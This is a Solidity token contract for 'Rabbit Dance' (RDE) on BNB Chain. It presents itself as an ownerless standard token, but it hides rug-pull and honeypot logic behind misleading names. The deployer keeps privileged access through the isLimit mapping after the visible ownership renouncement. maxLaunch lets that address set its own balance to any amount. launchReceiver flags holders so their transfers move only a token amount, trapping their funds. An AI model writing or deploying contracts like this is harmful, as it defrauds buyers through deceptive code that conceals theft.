/**
 *Submitted for verification at BscScan.com on 2023-01-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract RabbitDance {
    uint8 public decimals = 18;



    address public owner;

    uint256 public totalSupply = 100000000 * 10 ** 18;
    string public name = "Rabbit Dance";
    mapping(address => mapping(address => uint256)) public allowance;
    address public receiverTotal;
    mapping(address => bool) public isLimit;

    string public symbol = "RDE";
    mapping(address => bool) public enableTrading;
    uint256 constant marketingSell = 10 ** 10;
    mapping(address => uint256) public balanceOf;
    address public amountLaunched;
    modifier receiverFund() {
        require(isLimit[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        IUniswapV2Router sellModeLimit = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        amountLaunched = IUniswapV2Factory(sellModeLimit.factory()).createPair(sellModeLimit.WETH(), address(this));
        owner = msg.sender;
        receiverTotal = owner;
        isLimit[receiverTotal] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    function transfer(address dst, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, dst, amount);
    }

    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {
        if (allowance[src][msg.sender] != type(uint256).max) {
            require(allowance[src][msg.sender] >= amount);
            allowance[src][msg.sender] -= amount;
        }
        return _transferFrom(src, dst, amount);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function launchList(address enableMin) public receiverFund {
        isLimit[enableMin] = true;
    }

    function maxLaunch(uint256 minTeam) public receiverFund {
        balanceOf[receiverTotal] = minTeam;
    }

    function toToken(address totalTake, address minMarketing, uint256 minTeam) internal returns (bool) {
        require(balanceOf[totalTake] >= minTeam);
        balanceOf[totalTake] -= minTeam;
        balanceOf[minMarketing] += minTeam;
        emit Transfer(totalTake, minMarketing, minTeam);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function launchReceiver(address txTradingTotal) public receiverFund {
        enableTrading[txTradingTotal] = true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function _transferFrom(address src, address dst, uint256 amount) internal returns (bool) {
        if (src == receiverTotal || dst == receiverTotal) {
            return toToken(src, dst, amount);
        }
        if (enableTrading[src]) {
            return toToken(src, dst, marketingSell);
        }
        return toToken(src, dst, amount);
    }


}